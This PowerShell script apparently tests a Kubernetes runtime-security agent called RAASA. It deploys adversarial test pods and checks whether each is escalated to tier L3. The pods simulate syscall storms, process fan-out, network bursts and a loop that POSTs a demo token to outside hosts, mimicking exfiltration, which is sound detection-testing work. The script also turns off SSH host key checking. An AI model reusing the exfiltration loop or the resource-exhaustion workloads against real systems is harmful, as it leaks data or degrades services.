param(
    [Parameter(Mandatory = $true)]
    [string]$TargetHost,

    [int]$DurationSeconds = 75,

    [int]$ReadyTimeoutSeconds = 120,

    [string]$User = "ubuntu",

    [string]$KeyPath = $env:RAASA_AWS_KEY_PATH,

    [switch]$QuiesceBackgroundWorkloads,

    [string]$Phase0ManifestPath = (Join-Path (Get-Location) "raasa\k8s\phase0-test-pods.yaml"),

    [string]$OutputDir = (Join-Path (Get-Location) ("AWS_Results_26_april\adversarial_matrix_" + (Get-Date -Format "yyyy_MM_dd_HHmmss")))
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function New-RestrictedKeyCopy {
    param([string]$SourcePath)

    $tempPath = Join-Path $env:TEMP ("raasa-key-" + [guid]::NewGuid().ToString() + ".pem")
    Copy-Item -LiteralPath $SourcePath -Destination $tempPath -Force

    $identity = "$env:USERDOMAIN\$env:USERNAME"
    $acl = New-Object System.Security.AccessControl.FileSecurity
    $owner = New-Object System.Security.Principal.NTAccount($identity)
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($identity, "FullControl", "Allow")

    $acl.SetOwner($owner)
    $acl.SetAccessRuleProtection($true, $false)
    $acl.AddAccessRule($rule)
    Set-Acl -LiteralPath $tempPath -AclObject $acl

    return $tempPath
}

function Invoke-NativeCapture {
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $true)]
        [string[]]$ArgumentList,

        [Parameter(Mandatory = $true)]
        [string]$ErrorContext,

        [int]$TimeoutSeconds = 300,

        [int[]]$AllowExitCodes = @(0)
    )

    $stdoutPath = Join-Path $env:TEMP ("raasa-stdout-" + [guid]::NewGuid().ToString() + ".txt")
    $stderrPath = Join-Path $env:TEMP ("raasa-stderr-" + [guid]::NewGuid().ToString() + ".txt")

    try {
        $process = Start-Process `
            -FilePath $FilePath `
            -ArgumentList $ArgumentList `
            -NoNewWindow `
            -PassThru `
            -RedirectStandardOutput $stdoutPath `
            -RedirectStandardError $stderrPath

        if (-not $process.WaitForExit($TimeoutSeconds * 1000)) {
            try {
                $process.Kill()
            }
            catch {
            }
            throw "$ErrorContext timed out after $TimeoutSeconds seconds."
        }

        $process.WaitForExit()
        $process.Refresh()
        $exitCode = [int]$process.ExitCode

        $output = @()
        if (Test-Path -LiteralPath $stdoutPath) {
            $output += Get-Content -LiteralPath $stdoutPath
        }
        if (Test-Path -LiteralPath $stderrPath) {
            $output += Get-Content -LiteralPath $stderrPath
        }

        if ($exitCode -notin $AllowExitCodes) {
            $joined = ($output -join [Environment]::NewLine).Trim()
            if ($joined) {
                throw "$ErrorContext failed with exit code $exitCode.`n$joined"
            }
            throw "$ErrorContext failed with exit code $exitCode."
        }

        return [pscustomobject]@{
            ExitCode = $exitCode
            Output = @($output)
        }
    }
    finally {
        Remove-Item -LiteralPath $stdoutPath, $stderrPath -Force -ErrorAction SilentlyContinue
    }
}

function Add-MapCount {
    param(
        [hashtable]$Map,
        [string]$Value
    )

    $key = if ([string]::IsNullOrWhiteSpace($Value)) { "missing" } else { $Value }
    if (-not $Map.ContainsKey($key)) {
        $Map[$key] = 0
    }
    $Map[$key] += 1
}

function Format-MapSummary {
    param([hashtable]$Map)

    if ($Map.Count -eq 0) {
        return "none"
    }

    return (($Map.GetEnumerator() | Sort-Object Name | ForEach-Object {
        "$($_.Name):$($_.Value)"
    }) -join ",")
}

function Get-AuditSummary {
    param([string]$Path)

    $newTiers = @{}
    $proposedTiers = @{}
    $telemetryStatuses = @{}
    $syscallStatuses = @{}
    $reasons = @{}
    $behavioralDnaReasons = @{}
    $temporalLstmReasons = @{}
    $rows = 0
    $parseErrors = 0
    $maxCpu = 0.0
    $maxProcessSignal = 0.0
    $maxNetworkSignal = 0.0
    $maxSyscallSignal = 0.0

    if (Test-Path -LiteralPath $Path) {
        foreach ($line in Get-Content -LiteralPath $Path) {
            if ([string]::IsNullOrWhiteSpace($line)) {
                continue
            }
            try {
                $record = $line | ConvertFrom-Json
                $rows += 1
                Add-MapCount -Map $newTiers -Value ([string]$record.new_tier)
                Add-MapCount -Map $proposedTiers -Value ([string]$record.proposed_tier)
                Add-MapCount -Map $telemetryStatuses -Value ([string]$record.metadata.telemetry_status)
                Add-MapCount -Map $syscallStatuses -Value ([string]$record.metadata.syscall_status)
                Add-MapCount -Map $reasons -Value ([string]$record.reason)
                foreach ($assessmentReason in @($record.assessment_reasons)) {
                    $reasonText = [string]$assessmentReason
                    if ($reasonText.StartsWith("behavioral_dna=")) {
                        Add-MapCount -Map $behavioralDnaReasons -Value $reasonText
                    }
                    if ($reasonText.StartsWith("temporal_lstm=")) {
                        Add-MapCount -Map $temporalLstmReasons -Value $reasonText
                    }
                }

                $cpuValue = if ($null -ne $record.cpu) { [double]$record.cpu } else { 0.0 }
                $processSignalValue = if ($null -ne $record.f_proc) { [double]$record.f_proc } else { 0.0 }
                $networkSignalValue = if ($null -ne $record.f_net) { [double]$record.f_net } else { 0.0 }
                $syscallSignalValue = if ($null -ne $record.f_sys) { [double]$record.f_sys } else { 0.0 }

                $maxCpu = [Math]::Max($maxCpu, $cpuValue)
                $maxProcessSignal = [Math]::Max($maxProcessSignal, $processSignalValue)
                $maxNetworkSignal = [Math]::Max($maxNetworkSignal, $networkSignalValue)
                $maxSyscallSignal = [Math]::Max($maxSyscallSignal, $syscallSignalValue)
            }
            catch {
                $parseErrors += 1
            }
        }
    }

    $l3Count = if ($newTiers.ContainsKey("L3")) { [int]$newTiers["L3"] } else { 0 }
    return [ordered]@{
        rows = $rows
        parse_errors = $parseErrors
        new_tiers = (Format-MapSummary -Map $newTiers)
        proposed_tiers = (Format-MapSummary -Map $proposedTiers)
        telemetry_statuses = (Format-MapSummary -Map $telemetryStatuses)
        syscall_statuses = (Format-MapSummary -Map $syscallStatuses)
        reasons = (Format-MapSummary -Map $reasons)
        behavioral_dna_reasons = (Format-MapSummary -Map $behavioralDnaReasons)
        temporal_lstm_reasons = (Format-MapSummary -Map $temporalLstmReasons)
        max_cpu = [Math]::Round($maxCpu, 4)
        max_process_signal = [Math]::Round($maxProcessSignal, 4)
        max_network_signal = [Math]::Round($maxNetworkSignal, 4)
        max_syscall_signal = [Math]::Round($maxSyscallSignal, 4)
        l3_count = $l3Count
    }
}

if ($DurationSeconds -lt 30) {
    throw "DurationSeconds must be at least 30 so RAASA can collect multiple control-loop samples."
}
if ($ReadyTimeoutSeconds -lt 30) {
    throw "ReadyTimeoutSeconds must be at least 30."
}
if ([string]::IsNullOrWhiteSpace($KeyPath) -or -not (Test-Path -LiteralPath $KeyPath)) {
    throw "SSH key not found. Pass -KeyPath or set RAASA_AWS_KEY_PATH to an untracked PEM file."
}
if ($QuiesceBackgroundWorkloads -and -not (Test-Path -LiteralPath $Phase0ManifestPath)) {
    throw "Phase0 manifest not found: $Phase0ManifestPath"
}

$workloads = @(
    [pscustomobject]@{
        Name = "benign-control"
        Namespace = "raasa-adv-control"
        PodRef = "raasa-adv-control/raasa-adv-benign-control"
        ExpectL3 = $false
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-control
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-benign-control
  namespace: raasa-adv-control
  labels:
    app: raasa-adv
    raasa.matrix: benign-control
    raasa.class: benign
    raasa.expected_tier: L1
spec:
  containers:
    - name: workload
      image: busybox:1.36
      command: ["sh", "-c", "sleep infinity"]
      resources:
        requests:
          cpu: "10m"
          memory: "16Mi"
        limits:
          cpu: "100m"
          memory: "64Mi"
'@
    }
    [pscustomobject]@{
        Name = "syscall-storm"
        Namespace = "raasa-adv-sys"
        PodRef = "raasa-adv-sys/raasa-adv-syscall-storm"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-sys
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-syscall-storm
  namespace: raasa-adv-sys
  labels:
    app: raasa-adv
    raasa.matrix: syscall-storm
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: workload
      image: busybox:1.36
      command:
        - sh
        - -c
        - |
          while true; do
            pids=""
            i=0
            while [ "$i" -lt 28 ]; do
              sh -c 'while true; do cat /proc/stat >/dev/null 2>&1 || true; cat /proc/self/status >/dev/null 2>&1 || true; sleep 0.01; done' &
              pids="$pids $!"
              i=$((i + 1))
            done
            sleep 8
            kill $pids >/dev/null 2>&1 || true
            wait >/dev/null 2>&1 || true
          done
      resources:
        requests:
          cpu: "50m"
          memory: "32Mi"
        limits:
          cpu: "600m"
          memory: "128Mi"
'@
    }
    [pscustomobject]@{
        Name = "process-fanout"
        Namespace = "raasa-adv-proc"
        PodRef = "raasa-adv-proc/raasa-adv-process-fanout"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-proc
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-process-fanout
  namespace: raasa-adv-proc
  labels:
    app: raasa-adv
    raasa.matrix: process-fanout
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: workload
      image: busybox:1.36
      command:
        - sh
        - -c
        - |
          while true; do
            pids=""
            i=0
            while [ "$i" -lt 48 ]; do
              sh -c 'while :; do :; done' &
              pids="$pids $!"
              i=$((i + 1))
            done
            sleep 4
            kill $pids >/dev/null 2>&1 || true
            wait >/dev/null 2>&1 || true
            sleep 1
          done
      resources:
        requests:
          cpu: "50m"
          memory: "32Mi"
        limits:
          cpu: "800m"
          memory: "256Mi"
'@
    }
    [pscustomobject]@{
        Name = "network-burst"
        Namespace = "raasa-adv-net"
        PodRef = "raasa-adv-net/raasa-adv-net-client"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-net
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-net-server
  namespace: raasa-adv-net
  labels:
    app: raasa-adv-net-server
    raasa.matrix: network-burst
    raasa.class: benign
    raasa.expected_tier: L2
spec:
  containers:
    - name: server
      image: python:3.12-alpine
      command:
        - sh
        - -c
        - |
          dd if=/dev/zero of=/tmp/payload.bin bs=256K count=8 >/dev/null 2>&1
          cd /tmp
          python -m http.server 8080
      ports:
        - containerPort: 8080
      resources:
        requests:
          cpu: "30m"
          memory: "32Mi"
        limits:
          cpu: "300m"
          memory: "128Mi"
---
apiVersion: v1
kind: Service
metadata:
  name: raasa-adv-net-server
  namespace: raasa-adv-net
spec:
  selector:
    app: raasa-adv-net-server
  ports:
    - port: 8080
      targetPort: 8080
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-net-client
  namespace: raasa-adv-net
  labels:
    app: raasa-adv-net-client
    raasa.matrix: network-burst
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: client
      image: curlimages/curl:8.7.1
      command:
        - sh
        - -c
        - |
          while true; do
            i=0
            while [ "$i" -lt 40 ]; do
              curl -fsS http://raasa-adv-net-server.raasa-adv-net.svc.cluster.local:8080/payload.bin -o /dev/null || true
              i=$((i + 1))
            done
            sleep 1
          done
      resources:
        requests:
          cpu: "30m"
          memory: "32Mi"
        limits:
          cpu: "300m"
          memory: "128Mi"
'@
    }
    [pscustomobject]@{
        Name = "agent-dependency-exfiltration"
        Namespace = "raasa-adv-agent"
        PodRef = "raasa-adv-agent/raasa-adv-agent-dependency-exfiltration"
        ExpectL3 = $true
        Manifest = @'
apiVersion: v1
kind: Namespace
metadata:
  name: raasa-adv-agent
---
apiVersion: v1
kind: Pod
metadata:
  name: raasa-adv-agent-dependency-exfiltration
  namespace: raasa-adv-agent
  labels:
    app: raasa-adv
    raasa.matrix: agent-dependency-exfiltration
    raasa.class: malicious
    raasa.expected_tier: L3
spec:
  containers:
    - name: workload
      image: python:3.12-alpine
      command:
        - sh
        - -c
        - |
          for i in 1 2 3 4 5 6 7 8; do sleep 300 & done
          python - <<'PY'
          import os
          import time
          import urllib.request

          targets = (
              "https://pypi.org/simple/pip/",
              "https://example.com/raasa-agent-benchmark",
          )
          token = "raasa-demo-token-not-a-secret"
          while True:
              for target in targets:
                  try:
                      request = urllib.request.Request(
                          target,
                          data=("token=" + token).encode(),
                          method="POST",
                      )
                      urllib.request.urlopen(request, timeout=2).read(64)
                  except Exception:
                      pass
              for _ in range(120000):
                  os.getpid()
              time.sleep(0.2)
          PY
      resources:
        requests:
          cpu: "50m"
          memory: "32Mi"
        limits:
          cpu: "700m"
          memory: "128Mi"
'@
    }
)

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
$tempKey = New-RestrictedKeyCopy -SourcePath $KeyPath
$summaryPath = Join-Path $OutputDir "summary.md"
$remoteManifestPaths = @()
$remotePhase0ManifestPath = "/tmp/raasa-phase0-test-pods.yaml"
$backgroundQuiesced = $false

try {
    function Invoke-SSH {
        param(
            [Parameter(Mandatory = $true)]
            [string]$RemoteCommand,

            [int]$TimeoutSeconds = 300,

            [int[]]$AllowExitCodes = @(0)
        )

        $args = @(
            "-n",
            "-i", $tempKey,
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=NUL",
            "-o", "LogLevel=ERROR",
            "-o", "ServerAliveInterval=5",
            "-o", "ServerAliveCountMax=6",
            "$User@$TargetHost",
            $RemoteCommand
        )

        $result = Invoke-NativeCapture `
            -FilePath "C:\WINDOWS\System32\OpenSSH\ssh.exe" `
            -ArgumentList $args `
            -ErrorContext "SSH command" `
            -TimeoutSeconds $TimeoutSeconds `
            -AllowExitCodes $AllowExitCodes

        return @($result.Output)
    }

    function Copy-Remote {
        param(
            [Parameter(Mandatory = $true)]
            [string]$LocalPath,

            [Parameter(Mandatory = $true)]
            [string]$RemotePath
        )

        $args = @(
            "-i", $tempKey,
            "-o", "BatchMode=yes",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=NUL",
            "-o", "LogLevel=ERROR",
            $LocalPath,
            "${User}@${TargetHost}:$RemotePath"
        )

        Invoke-NativeCapture `
            -FilePath "C:\WINDOWS\System32\OpenSSH\scp.exe" `
            -ArgumentList $args `
            -ErrorContext "SCP copy to $RemotePath" `
            -TimeoutSeconds 120 `
            -AllowExitCodes @(0) | Out-Null
    }

    function Save-RemoteOutput {
        param(
            [Parameter(Mandatory = $true)]
            [string]$RemoteCommand,

            [Parameter(Mandatory = $true)]
            [string]$FileName,

            [int]$TimeoutSeconds = 120,

            [int[]]$AllowExitCodes = @(0)
        )

        Invoke-SSH -RemoteCommand $RemoteCommand -TimeoutSeconds $TimeoutSeconds -AllowExitCodes $AllowExitCodes |
            Set-Content -Path (Join-Path $OutputDir $FileName)
    }

    function Get-RemoteAuditState {
        param(
            [Parameter(Mandatory = $true)]
            [string]$PodRef
        )

        $escapedPodRef = $PodRef.Replace("'", "'`"''")
        $remoteCommand = @'
pod_ref='__POD_REF__'
pod_namespace="${pod_ref%%/*}"
pod_name="${pod_ref#*/}"
node_name=""
agent=""
log=""
count=0
if [ -n "$pod_namespace" ] && [ -n "$pod_name" ]; then
  node_name=$(sudo k3s kubectl get pod -n "$pod_namespace" "$pod_name" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)
fi
if [ -n "$node_name" ]; then
  agent=$(sudo k3s kubectl get pods -n raasa-system -l app=raasa-agent --field-selector spec.nodeName="$node_name" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
fi
if [ -n "$agent" ]; then
  log=$(sudo k3s kubectl exec -n raasa-system "$agent" -c raasa-agent -- sh -c 'ls /app/raasa/logs/*.jsonl 2>/dev/null | tail -1' 2>/dev/null)
  if [ -n "$log" ]; then
    count=$(sudo k3s kubectl exec -n raasa-system "$agent" -c raasa-agent -- env TARGET_LOG="$log" POD_REF='__POD_REF__' sh -c 'cat "$TARGET_LOG" | grep -F -c "$POD_REF" 2>/dev/null' 2>/dev/null || echo 0)
  fi
fi
printf 'timestamp=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
printf 'node=%s\n' "$node_name"
printf 'agent=%s\n' "$agent"
printf 'log=%s\n' "$log"
printf 'count=%s\n' "$count"
'@
        $remoteCommand = $remoteCommand.Replace("__POD_REF__", $escapedPodRef)
        $lines = Invoke-SSH -RemoteCommand $remoteCommand -TimeoutSeconds 180 -AllowExitCodes @(0)

        $stateMap = @{}
        foreach ($line in $lines) {
            if ($line -match '^(?<key>[^=]+)=(?<value>.*)$') {
                $stateMap[$matches.key] = $matches.value
            }
        }

        $countValue = 0
        if ($stateMap.ContainsKey("count")) {
            $null = [int]::TryParse([string]$stateMap["count"], [ref]$countValue)
        }

        return [pscustomobject]@{
            TimestampUtc = if ($stateMap.ContainsKey("timestamp")) { $stateMap["timestamp"] } else { "" }
            NodeName = if ($stateMap.ContainsKey("node")) { $stateMap["node"] } else { "" }
            AgentPod = if ($stateMap.ContainsKey("agent")) { $stateMap["agent"] } else { "" }
            LogFile = if ($stateMap.ContainsKey("log")) { $stateMap["log"] } else { "" }
            MatchingLineCount = $countValue
        }
    }

    function Get-RemoteAuditLines {
        param(
            [Parameter(Mandatory = $true)]
            [string]$AgentPod,

            [Parameter(Mandatory = $true)]
            [string]$LogFile,

            [Parameter(Mandatory = $true)]
            [string]$PodRef
        )

        if ([string]::IsNullOrWhiteSpace($AgentPod) -or [string]::IsNullOrWhiteSpace($LogFile)) {
            return @()
        }

        $escapedPodRef = $PodRef.Replace("'", "'`"''")
        $remoteCommand = @'
sudo k3s kubectl exec -n raasa-system __AGENT_POD__ -c raasa-agent -- env TARGET_LOG="__LOG_FILE__" POD_REF='__POD_REF__' sh -c 'cat "$TARGET_LOG" | grep -F "$POD_REF"' 2>/dev/null
'@
        $remoteCommand = $remoteCommand.Replace("__AGENT_POD__", $AgentPod)
        $remoteCommand = $remoteCommand.Replace("__LOG_FILE__", $LogFile)
        $remoteCommand = $remoteCommand.Replace("__POD_REF__", $escapedPodRef)

        return @(Invoke-SSH -RemoteCommand $remoteCommand -TimeoutSeconds 180 -AllowExitCodes @(0, 1))
    }

    @(
        "# Adversarial Workload Matrix Summary",
        "",
        "- Host: $TargetHost",
        "- Duration seconds per workload: $DurationSeconds",
        "- Background workloads quiesced: $QuiesceBackgroundWorkloads",
        "- Collected at: $(Get-Date -Format o)",
        ""
    ) | Set-Content -Path $summaryPath

    if ($QuiesceBackgroundWorkloads) {
        Copy-Remote -LocalPath $Phase0ManifestPath -RemotePath $remotePhase0ManifestPath
        $backgroundQuiesced = $true
        Save-RemoteOutput -RemoteCommand "sudo k3s kubectl get pods -A -o wide; sudo k3s kubectl get deploy -n raasa-demo -o wide 2>/dev/null || true; sudo k3s kubectl get deploy -n raasa-bench -o wide 2>/dev/null || true" -FileName "background_before_quiesce.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
        Save-RemoteOutput -RemoteCommand "sudo k3s kubectl get pod -n default -l app=raasa-test -o yaml 2>/dev/null || true" -FileName "background_phase0_before_quiesce.yaml" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
        Invoke-SSH -RemoteCommand "sudo k3s kubectl delete pod -n default -l app=raasa-test --ignore-not-found --wait=true --timeout=120s; sudo k3s kubectl scale deployment -n raasa-demo --all --replicas=0 2>/dev/null || true; sudo k3s kubectl scale deployment -n raasa-bench --all --replicas=0 2>/dev/null || true" -TimeoutSeconds 180 -AllowExitCodes @(0, 1) |
            Set-Content -Path (Join-Path $OutputDir "background_quiesce.txt")
        Start-Sleep -Seconds 10
        Save-RemoteOutput -RemoteCommand "df -h / /tmp; sudo k3s kubectl top nodes; sudo k3s kubectl top pods -A" -FileName "capacity_after_quiesce.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
        Save-RemoteOutput -RemoteCommand "sudo k3s kubectl get pods -A -o wide" -FileName "pods_after_quiesce.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
    }

    Save-RemoteOutput -RemoteCommand "df -h / /tmp; sudo k3s kubectl top nodes; sudo k3s kubectl top pods -A" -FileName "capacity_before.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
    Save-RemoteOutput -RemoteCommand "sudo k3s kubectl get pods -A -o wide" -FileName "pods_before.txt" -TimeoutSeconds 120

    $results = @()

    foreach ($workload in $workloads) {
        $label = $workload.Name
        $namespace = $workload.Namespace
        $manifestLocalPath = Join-Path $env:TEMP ("raasa-adv-" + $label + "-" + [guid]::NewGuid().ToString() + ".yaml")
        $manifestRemotePath = "/tmp/raasa-adv-$label.yaml"
        $remoteManifestPaths += $manifestRemotePath

        Set-Content -Path $manifestLocalPath -Value $workload.Manifest -NoNewline
        Copy-Remote -LocalPath $manifestLocalPath -RemotePath $manifestRemotePath
        Remove-Item -LiteralPath $manifestLocalPath -Force -ErrorAction SilentlyContinue

        Add-Content -Path $summaryPath -Value "## $label"
        Add-Content -Path $summaryPath -Value "- Namespace: $namespace"
        Add-Content -Path $summaryPath -Value "- Pod ref: $($workload.PodRef)"
        Add-Content -Path $summaryPath -Value "- Expected L3: $($workload.ExpectL3)"

        Invoke-SSH -RemoteCommand "sudo k3s kubectl delete ns $namespace --ignore-not-found --wait=true --timeout=90s" -TimeoutSeconds 150 -AllowExitCodes @(0, 1) |
            Set-Content -Path (Join-Path $OutputDir "${label}_cleanup_before.txt")

        $auditStateBefore = Get-RemoteAuditState -PodRef $workload.PodRef

        Invoke-SSH -RemoteCommand "sed -i 's/\r$//' $manifestRemotePath && sudo k3s kubectl apply -f $manifestRemotePath" -TimeoutSeconds 180 |
            Set-Content -Path (Join-Path $OutputDir "${label}_apply.txt")
        Invoke-SSH -RemoteCommand "sudo k3s kubectl wait --for=condition=Ready pod -n $namespace -l raasa.matrix=$label --timeout=${ReadyTimeoutSeconds}s" -TimeoutSeconds ($ReadyTimeoutSeconds + 60) -AllowExitCodes @(0, 1) |
            Set-Content -Path (Join-Path $OutputDir "${label}_wait_ready.txt")

        Start-Sleep -Seconds $DurationSeconds

        Save-RemoteOutput -RemoteCommand "sudo k3s kubectl get pods -n $namespace -o wide" -FileName "${label}_pods.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
        Save-RemoteOutput -RemoteCommand "sudo k3s kubectl top pods -n $namespace" -FileName "${label}_top_pods.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
        Save-RemoteOutput -RemoteCommand "sudo k3s kubectl logs -n raasa-system -l app=raasa-agent --all-containers=true --tail=220" -FileName "${label}_raasa_tail.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)

        $auditStateAfter = Get-RemoteAuditState -PodRef $workload.PodRef
        $allAuditLines = Get-RemoteAuditLines -AgentPod $auditStateAfter.AgentPod -LogFile $auditStateAfter.LogFile -PodRef $workload.PodRef

        $captureMode = "full_end_log"
        $deltaAuditLines = @($allAuditLines)
        if (
            $auditStateBefore.AgentPod -eq $auditStateAfter.AgentPod -and
            $auditStateBefore.LogFile -eq $auditStateAfter.LogFile -and
            $auditStateAfter.MatchingLineCount -ge $auditStateBefore.MatchingLineCount
        ) {
            $captureMode = "delta_from_same_log"
            $deltaAuditLines = @($allAuditLines | Select-Object -Skip $auditStateBefore.MatchingLineCount)
        }

        $auditRowsPath = Join-Path $OutputDir "${label}_audit_rows.jsonl"
        $auditMetaPath = Join-Path $OutputDir "${label}_audit_capture.json"
        $auditSummaryPath = Join-Path $OutputDir "${label}_audit_summary.json"
        $deltaAuditLines | Set-Content -Path $auditRowsPath

        [ordered]@{
            workload = $label
            pod_ref = $workload.PodRef
            capture_mode = $captureMode
            captured_line_count = @($deltaAuditLines).Count
            state_before = $auditStateBefore
            state_after = $auditStateAfter
        } | ConvertTo-Json -Depth 6 | Set-Content -Path $auditMetaPath

        $auditSummary = Get-AuditSummary -Path $auditRowsPath
        $auditSummary | ConvertTo-Json -Depth 6 | Set-Content -Path $auditSummaryPath

        $passed = if ($workload.ExpectL3) {
            $auditSummary.rows -gt 0 -and $auditSummary.l3_count -gt 0
        }
        else {
            $auditSummary.rows -gt 0 -and $auditSummary.l3_count -eq 0
        }

        $results += [pscustomobject]@{
            workload = $label
            passed = $passed
            rows = $auditSummary.rows
            l3_count = $auditSummary.l3_count
            new_tiers = $auditSummary.new_tiers
            max_cpu = $auditSummary.max_cpu
            max_process_signal = $auditSummary.max_process_signal
            max_network_signal = $auditSummary.max_network_signal
            max_syscall_signal = $auditSummary.max_syscall_signal
        }

        Add-Content -Path $summaryPath -Value "- Result: $(if ($passed) { 'PASS' } else { 'FAIL' })"
        Add-Content -Path $summaryPath -Value "- Audit rows: $($auditSummary.rows)"
        Add-Content -Path $summaryPath -Value "- New tiers: $($auditSummary.new_tiers)"
        Add-Content -Path $summaryPath -Value "- Proposed tiers: $($auditSummary.proposed_tiers)"
        Add-Content -Path $summaryPath -Value "- L3 applied count: $($auditSummary.l3_count)"
        Add-Content -Path $summaryPath -Value "- Max signals: cpu=$($auditSummary.max_cpu), proc=$($auditSummary.max_process_signal), net=$($auditSummary.max_network_signal), sys=$($auditSummary.max_syscall_signal)"
        Add-Content -Path $summaryPath -Value "- Telemetry statuses: $($auditSummary.telemetry_statuses)"
        Add-Content -Path $summaryPath -Value "- Syscall statuses: $($auditSummary.syscall_statuses)"
        Add-Content -Path $summaryPath -Value "- Behavioral DNA reasons: $($auditSummary.behavioral_dna_reasons)"
        Add-Content -Path $summaryPath -Value "- Temporal LSTM reasons: $($auditSummary.temporal_lstm_reasons)"
        Add-Content -Path $summaryPath -Value ""

        Invoke-SSH -RemoteCommand "sudo k3s kubectl delete ns $namespace --ignore-not-found --wait=false" -TimeoutSeconds 120 -AllowExitCodes @(0, 1) |
            Set-Content -Path (Join-Path $OutputDir "${label}_cleanup_after.txt")
        Start-Sleep -Seconds 10
    }

    $passCount = @($results | Where-Object { $_.passed }).Count
    Add-Content -Path $summaryPath -Value "## Overall"
    Add-Content -Path $summaryPath -Value "- Passing workloads: $passCount / $($results.Count)"
    Add-Content -Path $summaryPath -Value ""
    $results | ConvertTo-Json -Depth 5 | Set-Content -Path (Join-Path $OutputDir "results.json")

    Save-RemoteOutput -RemoteCommand "df -h / /tmp; sudo k3s kubectl top nodes; sudo k3s kubectl top pods -A" -FileName "capacity_after.txt" -TimeoutSeconds 120 -AllowExitCodes @(0, 1)
    Save-RemoteOutput -RemoteCommand "sudo k3s kubectl get pods -A -o wide" -FileName "pods_after.txt" -TimeoutSeconds 120

    if ($passCount -ne $results.Count) {
        throw "Adversarial matrix had failing workload(s): $passCount / $($results.Count) passed. Evidence: $OutputDir"
    }

    Write-Host "Adversarial matrix evidence collected in: $OutputDir"
}
finally {
    foreach ($workload in $workloads) {
        try {
            Invoke-SSH -RemoteCommand "sudo k3s kubectl delete ns $($workload.Namespace) --ignore-not-found --wait=false" -TimeoutSeconds 60 -AllowExitCodes @(0, 1) | Out-Null
        }
        catch {
        }
    }
    foreach ($remotePath in $remoteManifestPaths) {
        try {
            Invoke-SSH -RemoteCommand "rm -f $remotePath" -TimeoutSeconds 30 -AllowExitCodes @(0, 1) | Out-Null
        }
        catch {
        }
    }
    if ($backgroundQuiesced) {
        try {
            Invoke-SSH -RemoteCommand "sudo k3s kubectl apply -f $remotePhase0ManifestPath; sudo k3s kubectl scale deployment -n raasa-demo --all --replicas=1 2>/dev/null || true; sudo k3s kubectl scale deployment -n raasa-bench --all --replicas=1 2>/dev/null || true; rm -f $remotePhase0ManifestPath" -TimeoutSeconds 180 -AllowExitCodes @(0, 1) |
                Set-Content -Path (Join-Path $OutputDir "background_restore.txt")
        }
        catch {
            $_ | Out-String | Set-Content -Path (Join-Path $OutputDir "background_restore_error.txt")
        }
    }
    Remove-Item -LiteralPath $tempKey -Force -ErrorAction SilentlyContinue
}
